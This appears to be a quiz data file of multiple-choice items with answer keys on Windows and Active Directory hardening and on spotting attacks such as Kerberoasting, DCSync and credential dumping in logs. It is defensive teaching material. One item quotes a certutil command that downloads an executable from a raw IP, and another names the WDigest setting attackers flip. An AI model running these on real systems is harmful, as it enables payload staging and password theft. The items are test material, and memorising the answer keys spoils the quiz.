    "question": "Why do hardening guides often require SMB signing on Windows clients and servers?",
    "options": [
      "Because signed SMB sessions encrypt the entire file payload with a per-connection AES key, so offline copies of shares cannot be read later without also stealing the domain krbtgt hash",
      "Because a signed SMB exchange binds each response to the session key, so an attacker who relays captured NTLM auth cannot usefully speak SMB as that user",
      "Because SMB signing replaces NTLM with Kerberos on every share access by policy, so pass-the-hash against local accounts stops working even when signing is the only change made",
      "Because the signing policy disables guest and null sessions globally across the estate, which is the only practical way to stop anonymous enumeration of shares and local users"
    ],
    "correct": 1,
    "explanation": "SMB signing uses the session key to integrity-protect SMB messages. After an NTLM relay, the attacker does not have that key, so a server that requires signing rejects the relayed SMB session. Signing is not full encryption of file data, does not by itself replace NTLM with Kerberos, and is separate from disabling guest/null sessions.",
    "difficulty": "Medium"
  },
  {
    "question": "What does Microsoft LAPS (Local Administrator Password Solution) mainly achieve on domain-joined Windows machines?",
    "options": [
      "It stores one shared local-admin password for the whole OU in a GPO preference item, rotated monthly, so helpdesk staff never need a domain account for break-glass access to any PC",
      "It disables the built-in local Administrator account entirely and replaces it with a gMSA whose password is fetched from AD only by principals that hold the Enroll permission on that account",
      "It moves local SAM password hashes into Credential Guard so even domain admins interactively logged on to the workstation cannot dump the local Administrator password with Mimikatz",
      "It sets a unique random local Administrator password per machine, stores it in AD, and lets only delegated groups read it, ending shared local-admin passwords"
    ],
    "correct": 3,
    "explanation": "LAPS (and Windows LAPS) gives each domain-joined PC a different random local Administrator password, saved in Active Directory (ms-Mcs-AdmPwd or the newer Windows LAPS attributes) and readable only by groups you delegate. That stops lateral movement that reused one local-admin password across many machines. It is not a single OU-wide password in a GPO, not a gMSA replacement for the local admin, and not Credential Guard.",
    "difficulty": "Medium"
  },
  {
    "question": "After a suspected golden-ticket incident, why do recovery guides tell you to reset the krbtgt account password twice, with replication in between?",
    "options": [
      "Because golden tickets are keyed with the current and previous krbtgt keys; two resets flush both, so forged TGTs signed with either old key fail validation on every DC",
      "Because the first reset only marks krbtgt for deletion and the second reset recreates the account, which is required before PDC emulator ownership can move to a clean DC",
      "Because Kerberos caches the krbtgt hash in LSASS for one replication cycle; a single reset leaves the old hash in memory on every DC until the machine is rebooted twice",
      "Because AD stores krbtgt history as three passwords, and Microsoft requires three resets, but operators commonly stop at two when no RODC is present in the domain"
    ],
    "correct": 0,
    "explanation": "A golden ticket is a forged TGT signed with a krbtgt password hash. AD remembers the current and previous krbtgt keys for ticket decryption, so a single password reset still leaves the old key valid. Resetting twice (waiting for replication after each) retires both keys and invalidates tickets forged with either. It is not about deleting/recreating the account, LSASS caching across reboots, or a mandatory third reset for every forest.",
    "difficulty": "Hard"
  },
  {
    "question": "Why do Active Directory hardening guides recommend that domain admins work from a Privileged Access Workstation (PAW)?",
    "options": [
      "Because a dedicated, locked-down device used only for admin tasks keeps privileged credentials off machines that browse the web or read email",
      "Because a PAW stores every admin password in its TPM, so the domain controllers stop accepting NTLM and Kerberos logons that originate from any other client",
      "Because the PAW replaces the domain controller during maintenance windows, letting admins change Group Policy without replicating changes to the real DCs",
      "Because Windows only allows changes to the Domain Admins group from a machine whose hostname begins with PAW, which blocks remote attackers from editing it"
    ],
    "correct": 0,
    "explanation": "A PAW is a hardened workstation reserved for privileged administration, with no email, browsing or general apps. If admins sign in only there, their high-value credentials are never exposed on everyday machines where phishing or drive-by malware could steal them. It does not move passwords into a TPM to change how DCs accept logons, does not act as a DC, and has no hostname rule.",
    "difficulty": "Medium"
  },
  {
    "question": "What does PowerShell Just Enough Administration (JEA) mainly provide on a Windows server?",
    "options": [
      "A signed-script policy that refuses any PowerShell command unless it was written by a domain admin, which removes the need for separate administrator accounts",
      "A temporary elevation that adds the user to the local Administrators group for one hour and then logs the user off, giving a full admin shell for that window",
      "A constrained remoting endpoint where a user can run only the cmdlets and parameters in a role capability, often through a temporary virtual account",
      "A replacement for WinRM that tunnels PowerShell over SMB, so remote admin works even when the Windows Firewall blocks TCP ports 5985 and 5986"
    ],
    "correct": 2,
    "explanation": "JEA publishes a PowerShell remoting endpoint whose role capabilities list exactly which cmdlets, functions and parameters each group may use. Commands usually run as a temporary virtual or group-managed account, so helpdesk staff can, for example, restart a service without being local admins. It is not a signing policy, not a time-boxed membership of Administrators, and it still runs over WinRM.",
    "difficulty": "Medium"
  },
  {
    "question": "In Active Directory you enable Kerberos armoring (FAST, Flexible Authentication Secure Tunneling) for clients and DCs. What does it mainly add?",
    "options": [
      "It replaces RC4 and AES with a post-quantum cipher for all service tickets, so Kerberoasting hashes can no longer be cracked offline for any account",
      "It wraps the AS exchange in a channel keyed from the computer's own ticket, so pre-auth data cannot be cracked offline and errors cannot be spoofed",
      "It forces every user to present a smart card before a TGT is issued, so password logons fail on all domain-joined machines once armoring is required",
      "It stops DCs from issuing TGTs to accounts in Protected Users, and instead issues short-lived service tickets directly from the KDC for each logon"
    ],
    "correct": 1,
    "explanation": "FAST builds an armored tunnel for the AS-REQ/AS-REP exchange using a key from the machine account's TGT. That protects the user's pre-authentication data from offline password guessing, lets the KDC send signed errors that cannot be forged, and supports compound claims for Dynamic Access Control. It does not change service-ticket ciphers, does not require smart cards, and does not change how Protected Users get TGTs.",
    "difficulty": "Hard"
  },
  {
    "question": "A security team enables the Microsoft Defender Attack Surface Reduction (ASR) rule 'Block all Office applications from creating child processes'. Which attack does this mainly disrupt?",
    "options": [
      "Phishing pages that copy the Microsoft 365 sign-in screen, because the rule checks every link in an Office document against a list of known fake sites",
      "A malicious macro in a Word file that launches PowerShell or cmd.exe to download and run the next stage",
      "Ransomware that encrypts Office documents on file shares, because the rule makes .docx and .xlsx files read-only for every process except the Office apps",
      "Attackers stealing Office license keys from the registry, because the rule blocks other processes from reading the Office installation registry keys"
    ],
    "correct": 1,
    "explanation": "Many malware campaigns start with a document whose macro or exploit makes Word or Excel spawn PowerShell, cmd.exe, wscript or another binary to fetch the payload. This ASR rule stops Office apps from creating child processes, breaking that chain even if the user enables macros. It does not filter phishing links, does not protect files from ransomware (that is Controlled Folder Access) and has nothing to do with license keys.",
    "difficulty": "Medium"
  },
  {
    "question": "Why do Active Directory hardening guides treat membership of the built-in Backup Operators group on domain controllers as almost equal to Domain Admin?",
    "options": [
      "Because Backup Operators are automatically added to the Enterprise Admins group during every scheduled backup, so they can change the forest schema",
      "Because the group can reset the password of any user account, including the krbtgt account, without that change being written to the security log",
      "Because members can log on to every workstation as the local SYSTEM account, which lets them disable Microsoft Defender on all machines at once",
      "Because SeBackupPrivilege lets them read NTDS.dit and the registry hives, so they can extract every domain password hash"
    ],
    "correct": 3,
    "explanation": "Backup Operators hold SeBackupPrivilege and SeRestorePrivilege and can log on to domain controllers. Backup privilege bypasses file ACLs, so a member can copy NTDS.dit (for example from a shadow copy) and the SYSTEM hive, then extract all account hashes offline, krbtgt included. That is why the group belongs in Tier 0 and should normally be empty. It does not join Enterprise Admins, reset passwords silently or grant SYSTEM on workstations.",
    "difficulty": "Hard"
  },
  {
    "question": "On a domain controller, which log pattern is a common sign of Kerberoasting in an environment that normally uses AES for Kerberos?",
    "options": [
      "Many event 4769 (service ticket requested) entries from one user for several service accounts with ticket encryption type 0x17 (RC4)",
      "Many event 4625 (failed logon) entries for one account from many source IPs within a few minutes, followed by the account being locked out",
      "Event 4720 (user account created) for an account with a name that looks like a service, followed by that account being added to Domain Admins",
      "Event 1102 (audit log cleared) on the domain controller right after a member server was restarted outside the normal maintenance window"
    ],
    "correct": 0,
    "explanation": "In Kerberoasting an attacker asks the KDC for service tickets for accounts with SPNs and cracks them offline; requesting RC4 makes cracking much faster. On a DC this shows up as event 4769 with Ticket Encryption Type 0x17, often a burst from one user for many SPNs. Event 4625 bursts point to password spraying or brute force, 4720 plus group changes to persistence, and 1102 to someone hiding tracks.",
    "difficulty": "Medium"
  },
  {
    "question": "An analyst suspects PsExec-style lateral movement onto a file server. Which entry in that server's logs is the classic sign?",
    "options": [
      "Event 4740 (user account locked out) for the administrator account, because PsExec always tries several wrong passwords before it gets in",
      "Event 5156 (connection allowed by Windows Filtering Platform) on port 3389, because PsExec opens a hidden Remote Desktop session on the target",
      "System event 7045 (a service was installed), for example a new PSEXESVC service, usually just after a network logon (4624 type 3)",
      "Event 4800 (workstation locked) for the logged-on user, because PsExec locks the console so the user cannot see the commands being run"
    ],
    "correct": 2,
    "explanation": "PsExec copies a service binary to the target's ADMIN$ share and creates a service (PSEXESVC by default) to run commands, so the target logs System event 7045, plus Security event 4697 if auditing is on, next to a type 3 network logon from the source. Renamed services still show the same pattern. PsExec uses SMB on port 445, not RDP, and it does not need failed logons or lock the console.",
    "difficulty": "Medium"
  },
  {
    "question": "Attackers on a network run heavily obfuscated PowerShell (Base64 and string concatenation). Which Windows logging feature best shows the defenders what code actually ran?",
    "options": [
      "PowerShell transcription only, because it saves an exact copy of the Base64 command line typed at the console in a text file in each user profile",
      "PowerShell Script Block Logging, which writes event 4104 with the script blocks as executed, after much of the obfuscation is removed",
      "Windows Firewall logging with dropped packets enabled, because every PowerShell command creates a network connection that the log then records",
      "Audit Logon events on the domain controllers, because each PowerShell command is checked against Kerberos and appears in event 4768 entries"
    ],
    "correct": 1,
    "explanation": "Script Block Logging (event 4104 in Microsoft-Windows-PowerShell/Operational) records the code of each script block as PowerShell compiles it, so Base64 or concatenated strings show up in their decoded form, and Windows auto-logs blocks that look suspicious even when the policy is off. Transcription is useful but records console input and output rather than the decoded script. Firewall and Kerberos logon logs do not contain the PowerShell code at all.",
    "difficulty": "Medium"
  },
  {
    "question": "On a workstation with Sysmon, which event is the most direct sign that a tool such as Mimikatz is trying to read credentials from memory?",
    "options": [
      "Sysmon Event ID 3 (network connection) from lsass.exe to an external IP, because Mimikatz makes LSASS upload the hashes to the attacker's server",
      "Sysmon Event ID 11 (file created) for a .kirbi file in C:\\Windows\\System32, because Mimikatz must write every ticket there before reading hashes",
      "Sysmon Event ID 7 (image loaded) showing lsass.exe loading ntdll.dll, because LSASS only loads that library when a dumping tool has attached",
      "Sysmon Event ID 10 (process access) with lsass.exe as the target and an access mask such as 0x1010 from an unusual process"
    ],
    "correct": 3,
    "explanation": "Credential dumpers open a handle to lsass.exe with memory-read rights. Sysmon Event ID 10 (ProcessAccess) records the source process, the target and the GrantedAccess mask, and masks like 0x1010 or 0x1410 from a process that has no business touching LSASS are a classic detection. LSASS does not send hashes out over the network, .kirbi files are optional ticket exports saved wherever the attacker chooses, and every process loads ntdll.dll.",
    "difficulty": "Hard"
  },
  {
    "question": "A user's domain account locks out every few minutes, even after a password reset. Where do you look first to find which machine is sending the bad passwords?",
    "options": [
      "Event 4625 on the user's own laptop, because each failed logon is only ever recorded on the computer where the user is sitting",
      "Event 4740 on the domain controller with the PDC emulator role, where Caller Computer Name shows the source of the lockout",
      "Event 4720 on any domain controller, because the account is recreated every time it locks and the event lists the source host",
      "Event 4624 on the file server, because a lockout is logged as a successful logon with logon type 3 from the computer that caused it"
    ],
    "correct": 1,
    "explanation": "Bad password attempts are forwarded to the PDC emulator, which locks the account and logs event 4740 with the Caller Computer Name. That host is usually where a stale password lives: a mapped drive, a phone's mail app, a scheduled task or a service. Follow up with 4771 or 4776 failures on the DCs if needed. 4625 is a failed logon on the target machine, 4720 is account creation and 4624 is a successful logon.",
    "difficulty": "Medium"
  },
  {
    "question": "You suspect a DCSync attack. With Directory Service Access auditing on, which domain controller event best shows it?",
    "options": [
      "Event 4769 for the krbtgt service from a workstation, because DCSync asks the KDC for a service ticket for every account it wants to copy",
      "Event 5136 showing the domain root object was modified, because DCSync writes the stolen hashes into an attribute of that object first",
      "Event 4662 on the domain object with the DS-Replication-Get-Changes-All right, made by an account or host that is not a domain controller",
      "Event 4740 for many accounts at once, because DCSync pulls each password by trying logons until the domain controller locks the account"
    ],
    "correct": 2,
    "explanation": "DCSync uses the directory replication protocol (MS-DRSR) to ask a DC for password data, as a real DC would. With auditing on, the DC logs 4662 on the domain object with the replication rights, Get-Changes (1131f6aa-...) and Get-Changes-All (1131f6ad-...). Only DCs, and sometimes tools like Azure AD Connect, should do that, so the same request from a user account or workstation is a strong sign. DCSync does not modify objects, request krbtgt tickets or cause lockouts.",
    "difficulty": "Hard"
  },
  {
    "question": "Hunting for AS-REP roasting, which detail in the domain controller logs is the strongest lead?",
    "options": [
      "Event 4768 with Pre-Authentication Type 0 for accounts that have 'Do not require Kerberos preauthentication' set, from an unusual host",
      "Event 4769 with ticket encryption 0x17 for a service account, because AS-REP roasting always asks for RC4 service tickets from the KDC",
      "Event 4624 with logon type 10 on the domain controller, because AS-REP roasting needs an interactive RDP session to the KDC to work",
      "Event 4625 with status 0xC000006A for many users, because AS-REP roasting guesses passwords online until one of the logons succeeds"
    ],
    "correct": 0,
    "explanation": "In AS-REP roasting the attacker asks for a TGT for accounts that don't need Kerberos pre-authentication; the KDC answers with data encrypted with the user's key, which is then cracked offline. The DC logs 4768 with Pre-Authentication Type 0. Find those accounts with PowerShell (DoesNotRequirePreAuth) and clear the flag. 4769 with 0x17 points to Kerberoasting, and the attack needs neither RDP nor online password guessing.",
    "difficulty": "Medium"
  },
  {
    "question": "On a workstation you find event 4698 at 03:12, created by a user account that never logs on at night. The new item runs powershell.exe with an encoded command every 15 minutes. What does this most likely show?",
    "options": [
      "A routine Windows Update check, because Windows schedules its update scans with encoded PowerShell commands during the night",
      "A failed logon attempt, because 4698 records a wrong password and the encoded command is the hash of what the user typed",
      "A user's password being changed, because 4698 is written when a password reset runs and it lists the script that changed it",
      "Persistence through a new scheduled task, since 4698 means a task was created; review its XML in the event and remove it"
    ],
    "correct": 3,
    "explanation": "Event 4698 is logged when a scheduled task is created (with Audit Other Object Access Events on), and the event includes the task's XML with the action it runs. A task created at night by an unusual account that launches encoded PowerShell every few minutes is a classic persistence technique. Windows Update tasks are signed system tasks, failed logons are 4625 and password resets are 4724.",
    "difficulty": "Medium"
  },
  {
    "question": "Your EDR alerts that HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential was set to 1 on a Windows 10 server. Why is this a serious warning sign?",
    "options": [
      "It turns on NTLMv2 for the server, which is the default anyway, so the alert is a false positive left by an old security baseline",
      "It disables Windows Defender's real-time protection, so malware can be copied to the server without being scanned on arrival",
      "It makes LSASS keep cleartext passwords in memory again after the next logon, so a credential dumper can read them in plain text",
      "It forces every user to change their password at the next logon, which attackers use to lock administrators out of the server"
    ],
    "correct": 2,
    "explanation": "Since Windows 8.1 and Server 2012 R2, WDigest no longer keeps cleartext credentials in LSASS. Setting UseLogonCredential to 1 brings that back, so after users log on again a tool like Mimikatz can dump their passwords in plain text. Attackers set it to prepare for credential theft. Alert on the change, set it back to 0 and look for LSASS access. It has nothing to do with NTLMv2, Defender or forced password changes.",
    "difficulty": "Hard"
  },
  {
    "question": "Process logs on a PC show: certutil.exe -urlcache -split -f http://203.0.113.50/a.txt C:\\Users\\Public\\a.exe. Nobody on the IT team manages certificates on that PC. How should you read this?",
    "options": [
      "A normal certificate revocation check, because certutil downloads CRLs over HTTP and saves them as .exe files in Public",
      "A built-in Windows tool abused to download a file from the internet, a living-off-the-land trick; check and isolate a.exe",
      "A Windows Update repair, because certutil fetches replacement system files and stores them in the Public folder to install",
      "A harmless cache cleanup, because -urlcache deletes old downloads and -split -f only splits the log file into smaller parts"
    ],
    "correct": 1,
    "explanation": "certutil is a signed Windows binary meant for certificates, but '-urlcache -split -f <url> <file>' makes it download any file. Attackers use it to pull payloads without bringing their own downloader, which is why it is a well-known LOLBin. A .txt from a raw IP saved as an .exe in C:\\Users\\Public is a strong sign of malware staging, so isolate the host, collect the file and check its hash. CRL checks don't write executables, and Windows Update doesn't use certutil.",
    "difficulty": "Medium"
  }
];
